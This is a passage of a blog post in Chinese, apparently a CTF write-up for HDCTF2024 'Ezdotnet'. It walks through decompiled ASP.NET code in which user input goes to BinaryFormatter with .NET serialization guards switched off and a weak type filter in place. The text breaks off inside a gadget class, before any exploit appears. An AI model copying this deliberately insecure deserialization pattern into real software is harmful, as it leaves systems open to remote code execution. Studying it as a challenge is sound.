@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Dotnet Challenge - p0l1st&#39;s blog</title><meta name="author" content="p0l1st">
+<meta name="description" content="HDCTF2024 Ezdotnet 题目使用版本是.NET 6.0.0
+"><meta name="keywords" content='.NET Challenge'>
+  <meta itemprop="name" content="Dotnet Challenge">
+  <meta itemprop="description" content="HDCTF2024 Ezdotnet 题目使用版本是.NET 6.0.0">
+  <meta itemprop="datePublished" content="2026-08-25T23:30:16+08:00">
+  <meta itemprop="dateModified" content="2026-08-25T23:30:16+08:00">
+  <meta itemprop="wordCount" content="863">
+  <meta itemprop="keywords" content=".NET Challenge"><meta property="og:url" content="https://blog.p0l1st.top/post/dotnet-challenge/">
+  <meta property="og:site_name" content="p0l1st&#39;s blog">
+  <meta property="og:title" content="Dotnet Challenge">
+  <meta property="og:description" content="HDCTF2024 Ezdotnet 题目使用版本是.NET 6.0.0">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2026-08-25T23:30:16+08:00">
+    <meta property="article:modified_time" content="2026-08-25T23:30:16+08:00">
+    <meta property="article:tag" content=".NET Challenge">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Dotnet Challenge">
+  <meta name="twitter:description" content="HDCTF2024 Ezdotnet 题目使用版本是.NET 6.0.0">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="canonical" type="text/html" href="https://blog.p0l1st.top/post/dotnet-challenge/" title="Dotnet Challenge - p0l1st&#39;s blog" /><link rel="prev" type="text/html" href="https://blog.p0l1st.top/post/asp.net-viewstate%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="ASP.NET ViewState反序列化" /><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Dotnet Challenge",
+    "inLanguage": "en-us",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/blog.p0l1st.top\/post\/dotnet-challenge\/"
+    },"genre": "posts","keywords": ".NET Challenge","wordcount":  863 ,
+    "url": "https:\/\/blog.p0l1st.top\/post\/dotnet-challenge\/","datePublished": "2026-08-25T23:30:16+08:00","dateModified": "2026-08-25T23:30:16+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "p0l1st"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="narrow"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="p0l1st&#39;s blog"><span class="header-title-text">p0l1st&#39;s blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/archives/">Archives</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/">Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/">Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/">About</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/">Friends</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="p0l1st&#39;s blog"><span class="header-title-text">p0l1st&#39;s blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="menu-item"><a class="menu-link" href="/archives/">Archives</a></li><li class="menu-item"><a class="menu-link" href="/categories/">Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/">Tags</a></li><li class="menu-item"><a class="menu-link" href="/about/">About</a></li><li class="menu-item"><a class="menu-link" href="/friends/">Friends</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Dotnet Challenge</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img class="avatar" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603311542974.png' alt="p0l1st" height="16" width="16">&nbsp;p0l1st</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/.net/" class="post-category" title="Category - .NET"><i class="fa-regular fa-folder" aria-hidden="true"></i> .NET</a></span></div><div class="post-meta-line"><span title="published on 2026-08-25 23:30:16"><i class="fa-solid fa-calendar-days me-1" aria-hidden="true"></i><time datetime="2026-08-25">2026-08-25</time></span>&nbsp;<span title="863 words"><i class="fa-solid fa-pencil-alt me-1" aria-hidden="true"></i>About 900 words</span>&nbsp;<span><i class="fa-regular fa-clock me-1" aria-hidden="true"></i>5 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#hdctf2024-ezdotnet">HDCTF2024 Ezdotnet</a></li>
+    <li><a href="#other">Other</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h1 class="heading-element" id="hdctf2024-ezdotnet"><span>HDCTF2024 Ezdotnet</span>
+  <a href="#hdctf2024-ezdotnet" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>题目使用版本是.NET 6.0.0</p>
+<p><a href="https://dotnet.microsoft.com/en-us/download/dotnet/6.0" target="_blank" rel="external nofollow noopener noreferrer">https://dotnet.microsoft.com/en-us/download/dotnet/6.0</a></p>
+<p>Rider新建解决方案</p>
+<p><img loading="lazy" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/image%20(1).png' alt="image (1)"></p>
+<p>依赖项导入Ezdotnet.dll</p>
+<p><img loading="lazy" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/image%20(2).png' alt="image (2)"></p>
+<p>然后就可以查看源码了</p>
+<p><img loading="lazy" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/image%20(1113).png' alt="image (1113)"></p>
+<p>先看HomeController</p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-csharp"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="2" style="--fi-max-shown-lines:100;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="c1">// Decompiled with JetBrains decompiler</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Type: Ezdotnet.Controllers.HomeController</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Assembly: Ezdotnet, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// MVID: 8098D795-0B6C-416A-8237-665787DB3F9B</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Assembly location: C:\Users\p0l1st\Desktop\Ezdotnet\Ezdotnet.dll</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">Ezdotnet.Models</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">Ezdotnet.Utils</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">Microsoft.AspNetCore.Http</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">Microsoft.AspNetCore.Mvc</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">Microsoft.Extensions.Logging</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Diagnostics</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#nullable</span> <span class="n">enable</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">Ezdotnet.Controllers</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">HomeController</span> <span class="p">:</span> <span class="n">Controller</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="k">readonly</span> <span class="n">ILogger</span><span class="p">&lt;</span><span class="n">HomeController</span><span class="p">&gt;</span> <span class="n">_logger</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">HomeController</span><span class="p">(</span><span class="n">ILogger</span><span class="p">&lt;</span><span class="n">HomeController</span><span class="p">&gt;</span> <span class="n">logger</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="k">this</span><span class="p">.</span><span class="n">_logger</span> <span class="p">=</span> <span class="n">logger</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">IActionResult</span> <span class="n">Index</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">HttpContext</span><span class="p">.</span><span class="n">Request</span><span class="p">.</span><span class="n">Method</span> <span class="p">==</span> <span class="n">HttpMethods</span><span class="p">.</span><span class="n">Post</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">new</span> <span class="n">MyBinaryFormatter</span><span class="p">().</span><span class="n">Deserialize</span><span class="p">((</span><span class="kt">string</span><span class="p">)</span> <span class="k">this</span><span class="p">.</span><span class="n">HttpContext</span><span class="p">.</span><span class="n">Request</span><span class="p">.</span><span class="n">Form</span><span class="p">[</span><span class="s">&#34;base64str&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">IActionResult</span><span class="p">)</span> <span class="k">this</span><span class="p">.</span><span class="n">View</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">IActionResult</span> <span class="n">Privacy</span><span class="p">()</span> <span class="p">=&gt;</span> <span class="p">(</span><span class="n">IActionResult</span><span class="p">)</span> <span class="k">this</span><span class="p">.</span><span class="n">View</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">    [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">IActionResult</span> <span class="n">Error</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">IActionResult</span><span class="p">)</span> <span class="k">this</span><span class="p">.</span><span class="n">View</span><span class="p">((</span><span class="kt">object</span><span class="p">)</span> <span class="k">new</span> <span class="n">ErrorViewModel</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                                     <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                                         <span class="n">RequestId</span> <span class="p">=</span> <span class="p">(</span><span class="n">Activity</span><span class="p">.</span><span class="n">Current</span><span class="p">?.</span><span class="n">Id</span> <span class="p">??</span> <span class="k">this</span><span class="p">.</span><span class="n">HttpContext</span><span class="p">.</span><span class="n">TraceIdentifier</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                         <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><p>Index</p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-csharp"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="1" style="--fi-max-shown-lines:100;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">public</span> <span class="n">IActionResult</span> <span class="n">Index</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">HttpContext</span><span class="p">.</span><span class="n">Request</span><span class="p">.</span><span class="n">Method</span> <span class="p">==</span> <span class="n">HttpMethods</span><span class="p">.</span><span class="n">Post</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">new</span> <span class="n">MyBinaryFormatter</span><span class="p">().</span><span class="n">Deserialize</span><span class="p">((</span><span class="kt">string</span><span class="p">)</span> <span class="k">this</span><span class="p">.</span><span class="n">HttpContext</span><span class="p">.</span><span class="n">Request</span><span class="p">.</span><span class="n">Form</span><span class="p">[</span><span class="s">&#34;base64str&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">IActionResult</span><span class="p">)</span> <span class="k">this</span><span class="p">.</span><span class="n">View</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><p>接收POST传参base64str，并调用<code>MyBinaryFormatter().Deserialize</code>对其进行反序列化</p>
+<pre tabindex="0"><code>MyBinaryFormatter().Deserialize
+namespace Ezdotnet.Utils;
+
+public class MyBinaryFormatter
+{
+  public void Deserialize(string base64String)
+  {
+    AppContext.SetSwitch(&#34;Switch.System.Data.AllowArbitraryDataSetTypeInstantiation&#34;, true);
+    AppContext.SetSwitch(&#34;Switch.System.Runtime.Serialization.SerializationGuard.AllowProcessCreation&#34;, true);
+    AppContext.SetSwitch(&#34;Switch.System.Runtime.Serialization.SerializationGuard.AllowAssembliesFromByteArrays&#34;, true);
+    using (MemoryStream serializationStream = new MemoryStream(Convert.FromBase64String(base64String)))
+      new BinaryFormatter()
+      {
+        Binder = ((SerializationBinder) new SecurityBinder())
+      }.Deserialize((Stream) serializationStream);
+  }
+}</code></pre><p>这里通过<code>AppContext.SetSwitch</code>关闭.NET安全防护机制</p>
+<p>对应关系如下</p>
+<div class="table-wrapper">
+  <table>
+    <thead>
+        <tr>
+            <th>开关</th>
+            <th>关闭的保护机制</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td><code>AllowArbitraryDataSetTypeInstantiation</code></td>
+            <td>允许反序列化时创建任意类型（包括恶意类型）</td>
+        </tr>
+        <tr>
+            <td><code>AllowProcessCreation</code></td>
+            <td><strong>允许反序列化过程中创建新进程</strong>（直接导致RCE）</td>
+        </tr>
+        <tr>
+            <td><code>AllowAssembliesFromByteArrays</code></td>
+            <td>允许从字节数组加载程序集（可执行任意代码）</td>
+        </tr>
+    </tbody>
+  </table>
+</div><p>使用<code>BinaryFormatter</code>进行反序列化，自定义过滤器</p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-csharp"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="2" style="--fi-max-shown-lines:100;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">SecurityBinder</span> <span class="p">:</span> <span class="n">SerializationBinder</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kd">override</span> <span class="n">Type</span><span class="p">?</span> <span class="n">BindToType</span><span class="p">(</span><span class="kt">string</span> <span class="n">assemblyName</span><span class="p">,</span> <span class="kt">string</span> <span class="n">typeName</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">$&#34;assemblyName:{assemblyName},typeName:{typeName}.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Type</span> <span class="n">type</span> <span class="p">=</span> <span class="n">Type</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s">$&#34;{typeName}, {assemblyName}&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(!(</span><span class="n">type</span> <span class="p">==</span> <span class="k">typeof</span> <span class="p">(</span><span class="n">InvokerTransformer</span><span class="p">))</span> <span class="p">&amp;&amp;</span> <span class="p">!(</span><span class="n">type</span> <span class="p">==</span> <span class="k">typeof</span> <span class="p">(</span><span class="n">ChainedTransformer</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">type</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;can&#39;t deseriliza rce class.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">Type</span><span class="p">)</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><p>过滤<code>InvokerTransformer</code>和<code>ChainedTransformer</code>，但是实际上并不影响反序列化</p>
+<p>题目还给了三个Bean</p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-csharp"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="2" style="--fi-max-shown-lines:100;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">Ezdotnet.Beans</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">[Serializable]</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">BadBean</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">private</span> <span class="n">Transformer</span> <span class="n">_transformer</span> <span class="p">=</span> <span class="p">(</span><span class="n">Transformer</span><span class="p">)</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="n">BadBean</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_transformer</span><span class="p">.</span><span class="n">methodName</span> <span class="p">=</span> <span class="s">&#34;DASCTF&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_transformer</span><span class="p">.</span><span class="n">methodParam</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[</span><span class="m">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="s">&#34;Welcome To HDCTF&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_transformer</span><span class="p">.</span><span class="n">typeName</span> <span class="p">=</span> <span class="s">&#34;Ezdotnet.Beans.GoodBean&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kd">override</span> <span class="kt">string</span> <span class="n">ToString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_transformer</span><span class="p">.</span><span class="n">transform</span><span class="p">((</span><span class="kt">object</span><span class="p">)</span> <span class="k">new</span> <span class="n">GoodBean</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">base</span><span class="p">.</span><span class="n">ToString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">Ezdotnet.Beans</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">[Serializable]</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">ChainedTransformer</span> <span class="p">:</span> <span class="n">Transformer</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kt">object</span> <span class="n">transform</span><span class="p">(</span><span class="kt">object</span> <span class="n">o</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">index</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">index</span> <span class="p">&lt;</span> <span class="k">this</span><span class="p">.</span><span class="n">_transformers</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="p">++</span><span class="n">index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="n">o</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">_transformers</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">transform</span><span class="p">(</span><span class="n">o</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">o</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kt">string</span> <span class="n">typeName</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kt">object</span><span class="p">[]</span> <span class="n">methodParam</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kt">string</span> <span class="n">methodName</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="n">InvokerTransformer</span><span class="p">[]</span> <span class="n">_transformers</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">Ezdotnet.Beans</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">[Serializable]</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">InvokerTransformer</span> <span class="p">:</span> <span class="n">Transformer</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kt">object</span> <span class="n">transform</span><span class="p">(</span><span class="kt">object</span> <span class="n">o</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">MethodInfo</span> <span class="n">method1</span> <span class="p">=</span> <span class="n">o</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetMethod</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">methodName</span><span class="p">,</span> <span class="k">new</span> <span class="n">Type</span><span class="p">[</span><span class="m">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
